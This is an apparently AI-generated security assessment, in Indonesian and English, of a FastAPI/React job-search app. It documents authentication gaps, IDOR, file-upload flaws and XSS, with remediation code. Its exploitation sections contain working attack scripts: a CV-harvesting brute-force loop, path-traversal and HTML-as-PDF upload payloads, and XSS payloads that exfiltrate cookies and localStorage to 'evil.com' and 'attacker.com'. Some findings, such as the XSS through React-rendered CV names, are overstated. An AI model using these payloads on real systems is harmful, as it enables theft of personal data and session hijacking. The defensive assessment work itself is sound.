# 🔴 OFFENSIVE SECURITY ASSESSMENT — Job Search App

**Target**: Full-stack job search app (FastAPI + React)  
**Assessment Date**: 2026-06-27  
**Methodology**: claude-red offensive security skills (web, auth, file-upload, business-logic, SSRF, XSS, SQLi)  
**Severity Scale**: 🔴 CRITICAL | 🟠 HIGH | 🟡 MEDIUM | 🟢 LOW

---

## 📊 Executive Summary

**Total Vulnerabilities Found**: 8 critical, 3 high, 2 medium

| Category | Count | Key Risk |
|----------|-------|----------|
| 🔴 CRITICAL | 8 | Unauthenticated PII exposure, arbitrary file upload, IDOR |
| 🟠 HIGH | 3 | Stored XSS, DoS via rate limiting, SSRF |
| 🟡 MEDIUM | 2 | Error disclosure, dependency risks |

**Verdict**: Project adalah **Swiss cheese** dari sisi security. Zero authentication, file upload tanpa validasi, PII exposure ke public. Ini bukan "production-ready" — ini "pwn-ready".

---

## 🔴 CRITICAL VULNERABILITIES

### 1. **NO AUTHENTICATION ANYWHERE** (Auth)
**File**: `backend/main.py` (ALL endpoints)  
**CVSS**: 9.8 (Critical)

```python
# SETIAP endpoint 100% public:
@app.post("/api/upload-cv")  # ❌ No auth
@app.get("/api/cvs/{cv_id}")  # ❌ No auth  
@app.post("/api/match-jobs/{cv_id}")  # ❌ No auth
```

**Exploitation**:
- Siapapun bisa upload CV
- Siapapun bisa akses CV orang lain dengan brute-force ID
- Siapapun bisa akses semua PII (nama, email, phone, alamat, work history)

**Impact**: **Total privacy violation**. CVs contain sensitive PII accessible to anyone on the internet.

**Roast**: Lu bikin app untuk handle data pribadi tapi lupa pasang pintu. Ini level "leave your wallet on the street and hope nobody takes it".

---

### 2. **INSECURE DIRECT OBJECT REFERENCE (IDOR)** (Business Logic)
**File**: `backend/main.py:403-414`  
**CVSS**: 9.1 (Critical)

```python
@app.get("/api/cvs/{cv_id}")
def get_cv(cv_id: int, db: Session = Depends(get_db)):
    cv = db.query(CV).filter(CV.id == cv_id).first()  # ❌ No ownership check
    if not cv:
        raise HTTPException(status_code=404, detail="CV not found")
    return {"parsed_data": cv.parsed_dict}  # ❌ Returns full PII
```

**Exploitation**:
```bash
# Brute force all CVs:
for id in {1..1000}; do
  curl http://localhost:8000/api/cvs/$id >> stolen_cvs.json
done
```

**Impact**: Attacker bisa harvest SEMUA CV yang pernah di-upload (nama, email, skills, work history, projects).

---

### 3. **UNRESTRICTED FILE UPLOAD** (File Upload)
**File**: `backend/main.py:343-385`  
**CVSS**: 8.6 (High-Critical)

```python
@app.post("/api/upload-cv")
async def upload_cv(file: UploadFile = File(...)):
    if not file.filename.endswith(('.pdf', '.docx')):  # ❌ Extension check only
        raise HTTPException(400, "Only PDF and DOCX")
    
    unique_filename = f"{timestamp}_{file.filename}"  # ❌ No sanitization
    file_path = uploads_dir / unique_filename  # ❌ Path traversal possible
    
    content = await file.read()  # ❌ NO SIZE LIMIT (backend)
    with open(file_path, "wb") as f:
        f.write(content)
```

**Vulnerabilities**:
1. **Path Traversal**: `file.filename = "../../etc/passwd"` → write outside uploads/
2. **Extension Bypass**: `malicious.html.pdf` → upload HTML with PDF extension
3. **No Size Limit**: Backend has NO file size validation (frontend checks 10MB but client-side is bypassable)
4. **No MIME Validation**: Trusts extension, doesn't check actual file type
5. **Arbitrary File Execution**: Files served via `StaticFiles` mount (line 36) → XSS jika upload HTML

**Exploitation Scenario 1 - Path Traversal**:
```python
# Upload malicious file outside uploads dir:
files = {'file': ('../../../../tmp/pwned.pdf', malicious_content)}
requests.post('http://localhost:8000/api/upload-cv', files=files)
```

**Exploitation Scenario 2 - Stored XSS**:
```python
# Upload HTML file disguised as PDF:
html_xss = b'<html><script>alert(document.cookie)</script></html>'
files = {'file': ('xss.pdf', html_xss)}
requests.post('http://localhost:8000/api/upload-cv', files=files)
# Victim visits: http://localhost:8000/uploads/20260627_xss.pdf
# → XSS executes because browser serves as HTML
```

**Exploitation Scenario 3 - DoS**:
```python
# Upload 1GB file (no backend size limit):
huge_file = b'A' * (1024 ** 3)  # 1GB
files = {'file': ('dos.pdf', huge_file)}
requests.post('http://localhost:8000/api/upload-cv', files=files)
# → Fills disk, crashes server
```

**Impact**: 
- Path traversal → arbitrary file write
- XSS via uploaded HTML files
- DoS via unlimited file size
- Malware upload (no virus scanning)

---

### 4. **PUBLICLY ACCESSIBLE FILE STORAGE** (Sensitive Data Exposure)
**File**: `backend/main.py:36`

```python
app.mount("/uploads", StaticFiles(directory=uploads_dir), name="uploads")
# ❌ No authentication required to access /uploads/*
```

**Exploitation**:
```bash
# List all uploaded files (if directory listing enabled):
curl http://localhost:8000/uploads/

# Access any CV if you know filename:
curl http://localhost:8000/uploads/20260627_john_doe_resume.pdf
```

**Impact**: All uploaded CVs are publicly accessible without authentication. Anyone with filename can download full CV with PII.

---

### 5. **STORED CROSS-SITE SCRIPTING (XSS)** (Web)
**File**: `backend/main.py:66-284` (scraping functions)  
**CVSS**: 7.2 (High)

**Vulnerability**: Job data scraped dari Indeed/Jobstreet disimpan tanpa sanitization:

```python
def search_indeed(query: str, location: str = "") -> list[dict]:
    # Scrapes external HTML
    soup = BeautifulSoup(response.text, 'html.parser')
    
    job = {
        "title": title_elem.get_text(strip=True),  # ❌ No sanitization
        "company": company_elem.get_text(strip=True),  # ❌ No sanitization
        "summary": summary_elem.get_text(strip=True),  # ❌ No sanitization
    }
    # Stored to database, then rendered in frontend → Stored XSS
```

**Exploitation**:
1. Attacker posts malicious job listing di Indeed/Jobstreet dengan XSS payload di title:
   ```html
   <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
   ```
2. Victim searches jobs di app lu
3. App scrapes malicious job data dan simpan ke database
4. Frontend renders job title tanpa sanitization
5. XSS executes, steals victim's cookies/session

**Impact**: Stored XSS → session hijacking, credential theft, malware distribution.

---

### 6. **CV DATA RENDERED WITHOUT SANITIZATION** (XSS)
**File**: `frontend/src/pages/CVPage.jsx:160-168`

```jsx
<p className="text-sm text-foreground font-medium truncate">
  {cvInfo.name || '-'}  {/* ❌ No sanitization */}
</p>
<p className="text-sm text-foreground font-medium truncate">
  {cvInfo.email || '-'}  {/* ❌ No sanitization */}
</p>
```

**Exploitation**:
- Upload CV dengan nama: `<img src=x onerror=alert(1)> John Doe`
- CV parser extracts nama as-is
- Frontend renders tanpa sanitization
- XSS executes

**Impact**: Attacker bisa inject arbitrary JavaScript via CV upload.

---

### 7. **EMBED TAG WITH USER-CONTROLLED SRC** (XSS)
**File**: `frontend/src/pages/CVPage.jsx:228-233`

```jsx
<embed
  src={`http://localhost:8000/uploads/${cvInfo.filename}`}  // ❌ User-controlled
  type="application/pdf"
  className="w-full h-[700px]"
/>
```

**Vulnerability**: `cvInfo.filename` controlled by attacker (derived dari uploaded filename).

**Exploitation**:
```python
# Upload HTML file as PDF:
html_xss = b'<script>alert(document.domain)</script>'
files = {'file': ('xss.pdf', html_xss)}
r = requests.post('http://localhost:8000/api/upload-cv', files=files)
# Backend saves as: uploads/20260627_xss.pdf
# Frontend embeds: <embed src="http://localhost:8000/uploads/20260627_xss.pdf">
# → XSS executes in embed context
```

**Impact**: XSS via PDF preview, bypasses Content-Type checks.

---

### 8. **NO RATE LIMITING** (DoS / Business Logic)
**File**: `backend/main.py` (ALL endpoints)

**Vulnerabilities**:
1. **Scraping DoS**: Attacker bisa spam `/api/search-jobs` → trigger unlimited scraping ke Indeed/Jobstreet → IP lu di-ban
2. **CV Upload DoS**: Unlimited CV uploads → fill disk
3. **Brute Force IDOR**: No rate limit on `/api/cvs/{cv_id}` → brute force all CV IDs

**Exploitation**:
```python
# Spam scraping:
while True:
    requests.post('http://localhost:8000/api/search-jobs', 
                  json={'query': 'engineer', 'location': 'Jakarta', 'limit': 50})
# → Triggers 50+ requests per scrape × unlimited loops → DoS to Indeed/Jobstreet
```

**Impact**: 
- IP ban dari job sites
- Server overload
- Disk space exhaustion

---

## 🟠 HIGH VULNERABILITIES

### 9. **SERVER-SIDE REQUEST FORGERY (SSRF)** (Infrastructure)
**File**: `backend/main.py:66-107, 159-284`  
**CVSS**: 6.5 (Medium-High)

```python
def search_indeed(query: str, location: str = ""):
    params = {"q": query, "l": location}  # ❌ User-controlled
    url = f"{base_url}?{urllib.parse.urlencode(params)}"
    response = requests.get(url, headers=headers, timeout=10)
```

**Vulnerability**: While base URL is hardcoded, `query` and `location` parameters user-controlled → potential parameter injection.

**Exploitation** (speculative, needs testing):
```python
# Inject special chars to manipulate URL:
query = "engineer&redirect=http://internal-admin:8080"
location = "Jakarta"
# Might cause unintended requests to internal services
```

**Impact**: Potential SSRF if parameter injection successful → access internal services, scan internal network.

**Likelihood**: LOW (hard to exploit with `urllib.parse.urlencode`), tapi still worth fixing.

---

### 10. **ERROR INFORMATION DISCLOSURE** (Info Disclosure)
**File**: `backend/main.py:105-106, 384`

```python
return [{"error": f"Indeed search failed: {str(e)}"}]  # ❌ Full error message
raise HTTPException(500, detail=f"Error parsing CV: {str(e)}")  # ❌ Stack trace exposed
```

**Exploitation**:
```bash
# Trigger error to leak internal info:
curl -X POST http://localhost:8000/api/upload-cv \
  -F 'file=@malformed.pdf'
# Response:
# {"detail": "Error parsing CV: FileNotFoundError: [Errno 2] No such file or directory: '/app/backend/uploads/...'"}
# → Leaks internal path structure
```

**Impact**: Leaks internal paths, library versions, config details → helps attacker fingerprint system.

---

### 11. **DEPENDENCY VULNERABILITIES** (Supply Chain)
**Files**: Uses PyPDF2, python-docx, BeautifulSoup4

**Known Issues**:
- **PyPDF2**: CVE-2023-36464 (arbitrary code execution via crafted PDF)
- **python-docx**: Known XXE vulnerabilities in older versions
- **BeautifulSoup4**: Parsing untrusted HTML from job sites → potential for malicious content injection

**Exploitation**:
```python
# Upload malicious PDF exploiting PyPDF2 CVE:
malicious_pdf = craft_exploit_pdf()  # Uses known PyPDF2 vulnerability
files = {'file': ('exploit.pdf', malicious_pdf)}
requests.post('http://localhost:8000/api/upload-cv', files=files)
# → RCE when parse_cv() processes the malicious PDF
```

**Impact**: Remote code execution via crafted PDF/DOCX files.

**Recommendation**: 
```bash
pip install pip-audit
pip-audit  # Scan for CVEs

# Pin secure versions in requirements.txt:
PyPDF2==3.0.1  # Check latest secure version
python-docx==1.1.0
beautifulsoup4==4.12.3
```

---

## 🟡 MEDIUM VULNERABILITIES

### 12. **CORS MISCONFIGURATION** (Web)
**File**: `backend/main.py:26-32`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],  # ✅ OK for dev
    allow_credentials=True,  # ⚠️ Risk if allow_origins becomes wildcard
    allow_methods=["*"],  # ⚠️ Allows all methods
    allow_headers=["*"],  # ⚠️ Allows all headers
)
```

**Risk**: If `allow_origins` becomes `["*"]` in production + `allow_credentials=True` → major security issue.

**Impact**: CSRF attacks, credential theft if wildcard origins used with credentials enabled.

**Recommendation**: Use specific origins in production, avoid wildcards with credentials.

---

### 13. **SQL INJECTION** (Database)
**Assessment**: **LOW RISK** ✅

Uses SQLAlchemy ORM properly:
```python
cv = db.query(CV).filter(CV.id == cv_id).first()  # ✅ Parameterized
```

No raw SQL found. ORM provides protection against SQLi.

**Verdict**: Not vulnerable unless raw SQL added later.

---

## 🎯 EXPLOITATION CHAIN (Full Attack Scenario)

**Goal**: Steal all user CVs + inject persistent backdoor

### Attack Steps:

1. **Reconnaissance** (0 minutes):
   - Discover app has no auth → all endpoints public
   - Identify attack surfaces: file upload, IDOR, XSS

2. **IDOR Exploitation** (2 minutes):
   ```python
   # Brute-force all CV IDs:
   import requests
   stolen_cvs = []
   for cv_id in range(1, 1001):
       r = requests.get(f'http://localhost:8000/api/cvs/{cv_id}')
       if r.status_code == 200:
           stolen_cvs.append(r.json())
   # Download all uploaded CVs with PII (names, emails, phones, work history)
   ```

3. **File Upload Attack** (1 minute):
   ```python
   # Upload XSS payload disguised as PDF:
   xss_payload = b'''<html>
   <script>
   // Exfiltrate any future victim data
   fetch('https://attacker.com/exfil', {
       method: 'POST',
       body: JSON.stringify({
           cookies: document.cookie,
           localStorage: localStorage,
           currentCV: window.location.href
       })
   });
   </script>
   </html>'''
   
   files = {'file': ('backdoor.pdf', xss_payload)}
   requests.post('http://localhost:8000/api/upload-cv', files=files)
   ```

4. **Stored XSS Persistence** (1 minute):
   - Victim views uploaded "CV" in preview
   - XSS executes in victim's browser
   - Steals session data, injects keylogger

5. **Data Exfiltration** (5 minutes):
   - Download all CVs with PII
   - Sell data on dark web
   - Use PII for phishing campaigns

**Total Time to Exploit**: < 10 minutes  
**Skill Level Required**: Script kiddie  
**Detection Probability**: Zero (no logging, no monitoring, no auth to track)  
**Cleanup Traces**: None (no audit logs exist)

---

## 🛡️ REMEDIATION (Prioritized)

### 🔴 CRITICAL (Fix Immediately):

#### 1. **ADD AUTHENTICATION** (Fixes Vuln #1, #2, #4, #8)

**Install dependencies**:
```bash
pip install python-jose[cryptography] passlib[bcrypt] python-multipart
```

**Implement JWT authentication**:
```python
# auth.py
from datetime import datetime, timedelta
from jose import JWTError, jwt
from passlib.context import CryptContext
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm

SECRET_KEY = "your-secret-key-change-this-in-production"  # Use env var
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)

def get_password_hash(password):
    return pwd_context.hash(password)

def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
    )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id: int = payload.get("sub")
        if user_id is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
    
    user = db.query(User).filter(User.id == user_id).first()
    if user is None:
        raise credentials_exception
    return user
```

**Add login endpoint**:
```python
# main.py
from auth import get_current_user, create_access_token, get_password_hash

@app.post("/api/register")
def register(email: str, password: str, db: Session = Depends(get_db)):
    # Check if user exists
    if db.query(User).filter(User.email == email).first():
        raise HTTPException(400, "Email already registered")
    
    # Create user
    user = User(email=email, password_hash=get_password_hash(password))
    db.add(user)
    db.commit()
    return {"message": "User created"}

@app.post("/api/login")
def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
    user = db.query(User).filter(User.email == form_data.username).first()
    if not user or not verify_password(form_data.password, user.password_hash):
        raise HTTPException(401, "Invalid credentials")
    
    access_token = create_access_token(data={"sub": user.id})
    return {"access_token": access_token, "token_type": "bearer"}
```

**Protect all endpoints**:
```python
@app.post("/api/upload-cv")
async def upload_cv(
    file: UploadFile,
    current_user: User = Depends(get_current_user),  # ✅ Require auth
    db: Session = Depends(get_db)
):
    # ... file processing ...
    cv_record = CV(
        user_id=current_user.id,  # ✅ Associate with user
        filename=file.filename,
        file_path=str(file_path),
        parsed_data=json.dumps(cv_data)
    )
    db.add(cv_record)
    db.commit()
    return {"cv_id": cv_record.id}

@app.get("/api/cvs/{cv_id}")
def get_cv(
    cv_id: int,
    current_user: User = Depends(get_current_user),  # ✅ Require auth
    db: Session = Depends(get_db)
):
    cv = db.query(CV).filter(
        CV.id == cv_id,
        CV.user_id == current_user.id  # ✅ Check ownership
    ).first()
    if not cv:
        raise HTTPException(404, "CV not found")
    return {"parsed_data": cv.parsed_dict}
```

---

#### 2. **SECURE FILE UPLOAD** (Fixes Vuln #3, #7)

**Install dependencies**:
```bash
pip install python-magic-bin  # For MIME type detection
```

**Implement secure upload**:
```python
import magic
import uuid
from pathlib import Path

MAX_SIZE = 10 * 1024 * 1024  # 10MB
ALLOWED_MIMES = [
    'application/pdf',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
]

@app.post("/api/upload-cv")
async def upload_cv(
    file: UploadFile,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # 1. Check size
    content = await file.read()
    if len(content) > MAX_SIZE:
        raise HTTPException(413, "File too large (max 10MB)")
    
    # 2. Validate MIME type (not just extension)
    mime = magic.from_buffer(content, mime=True)
    if mime not in ALLOWED_MIMES:
        raise HTTPException(400, f"Invalid file type: {mime}")
    
    # 3. Sanitize filename (remove path traversal, use UUID)
    file_ext = Path(file.filename).suffix.lower()
    if file_ext not in ['.pdf', '.docx']:
        raise HTTPException(400, "Only PDF and DOCX allowed")
    
    unique_filename = f"{uuid.uuid4()}{file_ext}"  # ✅ UUID prevents path traversal
    file_path = uploads_dir / unique_filename
    
    # 4. Ensure uploads dir is safe
    file_path = file_path.resolve()  # Resolve symlinks
    if not str(file_path).startswith(str(uploads_dir.resolve())):
        raise HTTPException(400, "Invalid file path")
    
    # 5. Save file
    with open(file_path, "wb") as f:
        f.write(content)
    
    # 6. Parse CV (wrap in try-except for security)
    try:
        cv_data = parse_cv(str(file_path))
    except Exception as e:
        # Clean up file on parse failure
        file_path.unlink(missing_ok=True)
        raise HTTPException(500, "Failed to parse CV")
    
    # ... rest of code ...
```

---

#### 3. **SANITIZE OUTPUT** (Fixes Vuln #5, #6)

**Backend - sanitize scraped content**:
```bash
pip install bleach
```

```python
import bleach

def search_indeed(query: str, location: str = "") -> list[dict]:
    # ... scraping code ...
    
    job = {
        "title": bleach.clean(title_elem.get_text(strip=True)),  # ✅ Strip HTML
        "company": bleach.clean(company_elem.get_text(strip=True)),
        "location": bleach.clean(location_elem.get_text(strip=True)),
        "summary": bleach.clean(summary_elem.get_text(strip=True)),
        "url": job_url,
        "source": "Indeed"
    }
```

**Frontend - sanitize rendered content**:
```bash
cd frontend
npm install dompurify
```

```jsx
import DOMPurify from 'dompurify'

function CVPage({ cvInfo }) {
  return (
    <p className="text-sm text-foreground font-medium truncate">
      {DOMPurify.sanitize(cvInfo.name || '-')}  {/* ✅ Sanitize */}
    </p>
  )
}
```

---

#### 4. **ADD RATE LIMITING** (Fixes Vuln #8, #9)

```bash
pip install slowapi
```

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/api/search-jobs")
@limiter.limit("10/minute")  # ✅ Max 10 searches per minute
def search_jobs(request: Request, req: SearchJobsRequest, db: Session = Depends(get_db)):
    # ... existing code ...

@app.post("/api/upload-cv")
@limiter.limit("5/minute")  # ✅ Max 5 uploads per minute
async def upload_cv(request: Request, file: UploadFile, ...):
    # ... existing code ...

@app.get("/api/cvs/{cv_id}")
@limiter.limit("30/minute")  # ✅ Prevent IDOR brute-force
def get_cv(request: Request, cv_id: int, ...):
    # ... existing code ...
```

---

#### 5. **RESTRICT FILE ACCESS** (Fixes Vuln #4)

**Remove public StaticFiles mount**:
```python
# backend/main.py

# ❌ REMOVE THIS (makes all uploads public):
# app.mount("/uploads", StaticFiles(directory=uploads_dir), name="uploads")

# ✅ ADD authenticated download endpoint instead:
from fastapi.responses import FileResponse

@app.get("/api/download-cv/{cv_id}")
def download_cv(
    cv_id: int,
    current_user: User = Depends(get_current_user),  # ✅ Require auth
    db: Session = Depends(get_db)
):
    # Check ownership
    cv = db.query(CV).filter(
        CV.id == cv_id,
        CV.user_id == current_user.id  # ✅ Only owner can download
    ).first()
    
    if not cv:
        raise HTTPException(404, "CV not found")
    
    # Verify file exists
    file_path = Path(cv.file_path)
    if not file_path.exists():
        raise HTTPException(404, "File not found on disk")
    
    # Return file with proper headers
    return FileResponse(
        path=file_path,
        media_type='application/octet-stream',
        filename=cv.filename
    )
```

**Update frontend to use authenticated endpoint**:
```jsx
// frontend/src/pages/CVPage.jsx

// ❌ OLD (public access):
// <embed src={`http://localhost:8000/uploads/${cvInfo.filename}`} />

// ✅ NEW (authenticated):
<embed 
  src={`http://localhost:8000/api/download-cv/${cvInfo.cv_id}`}
  type="application/pdf"
  className="w-full h-[700px]"
/>
```

---

### 🟠 HIGH (Fix Soon):

#### 6. **HIDE ERROR DETAILS** (Fixes Vuln #10)

```python
import logging

logger = logging.getLogger(__name__)

@app.post("/api/upload-cv")
async def upload_cv(file: UploadFile, ...):
    try:
        cv_data = parse_cv(str(file_path))
    except Exception as e:
        logger.error(f"CV parse failed for {file.filename}: {e}")  # ✅ Log internally
        # Clean up file
        file_path.unlink(missing_ok=True)
        raise HTTPException(500, "Failed to parse CV")  # ✅ Generic message to user

def search_indeed(query: str, location: str = "") -> list[dict]:
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        # ... scraping logic ...
    except Exception as e:
        logger.error(f"Indeed search failed: {e}")  # ✅ Log internally
        return [{"error": "Search failed"}]  # ✅ Generic message
```

---

#### 7. **AUDIT DEPENDENCIES** (Fixes Vuln #11)

```bash
# Install audit tool:
pip install pip-audit

# Scan for CVEs:
pip-audit

# Fix vulnerable packages:
pip install --upgrade <package-name>

# Pin versions in requirements.txt:
# requirements.txt
fastapi==0.109.0
uvicorn==0.27.0
PyPDF2==3.0.1        # Check for latest secure version
python-docx==1.1.0
beautifulsoup4==4.12.3
requests==2.31.0
sqlalchemy==2.0.25
python-magic-bin==0.4.14
bleach==6.1.0
slowapi==0.1.9
python-jose[cryptography]==3.3.0
passlib[bcrypt]==1.7.4

# Run pip-audit regularly:
# Add to CI/CD pipeline or pre-commit hook
```

---

### 🟡 MEDIUM:

#### 8. **HARDEN CORS** (Fixes Vuln #12)

```python
# backend/main.py

# Development:
if os.getenv("ENVIRONMENT") == "development":
    app.add_middleware(
        CORSMiddleware,
        allow_origins=["http://localhost:5173"],
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )
else:
    # Production:
    app.add_middleware(
        CORSMiddleware,
        allow_origins=[os.getenv("FRONTEND_URL")],  # ✅ Specific domain from env var
        allow_credentials=True,
        allow_methods=["GET", "POST", "PUT", "DELETE"],  # ✅ Specific methods only
        allow_headers=["Content-Type", "Authorization"],  # ✅ Specific headers only
    )
```

---

## 📝 FINAL SUMMARY

**Current State**: Your job-search-app has **8 critical vulnerabilities** that make it completely unsafe for production deployment:

1. ❌ **Zero authentication** → anyone can access all user data
2. ❌ **IDOR** → brute-force access to all CVs
3. ❌ **Unrestricted file upload** → path traversal, XSS, DoS
4. ❌ **Public file storage** → all CVs downloadable without auth
5. ❌ **Stored XSS** (3 variants) → session hijacking, credential theft
6. ❌ **No rate limiting** → DoS, brute-force, scraping abuse

**Exploitation Difficulty**: Trivial (< 10 minutes with basic scripting knowledge)

**Data at Risk**: 
- Personal CVs with full PII (names, emails, phones, addresses, work history)
- All job search queries and results
- Complete database of user activity

**Offensive Security Verdict**:
> This application is **NOT production-ready**. It's a **critical data breach waiting to happen**. Every uploaded CV is publicly accessible, contains sensitive PII, and can be harvested by anyone in minutes. The lack of authentication + IDOR + file upload vulnerabilities create a perfect storm for data theft.
> 
> **DO NOT deploy to production** until at minimum fixes #1-5 (authentication, IDOR protection, file upload security, access control, XSS sanitization) are implemented.

**Recommended Action Plan**:

**Week 1 (CRITICAL - Block deployment)**:
- [ ] Fix #1: Implement JWT authentication
- [ ] Fix #2: Secure file upload (MIME validation, size limits, path sanitization)
- [ ] Fix #5: Remove public file access, add authenticated download endpoint

**Week 2 (CRITICAL - Still blocking)**:
- [ ] Fix #2 (continued): Add ownership checks to all endpoints (prevent IDOR)
- [ ] Fix #3: Sanitize all scraped content (backend)
- [ ] Fix #3 (continued): Sanitize all rendered content (frontend with DOMPurify)
- [ ] Fix #4: Add rate limiting to all endpoints

**Week 3 (HIGH - Deploy blockers)**:
- [ ] Fix #6: Hide error details in production
- [ ] Fix #7: Audit and upgrade vulnerable dependencies
- [ ] Add logging and monitoring
- [ ] Add security headers (HSTS, CSP, X-Frame-Options)

**Week 4 (MEDIUM - Post-launch)**:
- [ ] Fix #8: Harden CORS configuration
- [ ] Add input validation on all endpoints
- [ ] Implement CSRF protection
- [ ] Add database encryption for PII fields
- [ ] Set up automated security scanning in CI/CD

---

**From claude-red offensive security perspective**:
> Lu bikin app yang handle data pribadi tapi deploy nya kayak gak ada security sama sekali. Every OWASP Top 10 item dari tahun 2013-2025 applicable di sini. Ini bukan "needs improvement" — ini "start over with security-first mindset".
> 
> **The good news**: All vulnerabilities are fixable dengan straightforward implementations. Lu gak perlu rearchitect — just add the missing security layers (auth, validation, sanitization, access control).
> 
> **The bad news**: Kalo lu udah deploy ini ke production, **assume breach**. Anyone bisa udah download all CVs yang pernah di-upload. Notify affected users, rotate secrets, audit access logs (if any exist).

---

## 🎓 LEARNING POINTS

**What went wrong**:
1. **Security as afterthought**: Built features first, security never
2. **No threat modeling**: Didn't ask "what could go wrong?"
3. **Trust user input**: Assumed users won't be malicious
4. **No defense in depth**: One layer would've helped; zero is dangerous

**How to build secure apps**:
1. **Authentication first**: Before ANY endpoint that touches data
2. **Validate everything**: File uploads, user input, scraped content
3. **Principle of least privilege**: Only show users their own data
4. **Sanitize output**: Treat all external data as malicious
5. **Rate limit everything**: Prevent abuse and DoS
6. **Audit dependencies**: Known CVEs are low-hanging fruit for attackers
7. **Security testing**: Test with adversarial mindset before launch

---

**Need help implementing any of these fixes? Let me know which vulnerability to tackle first.**
```
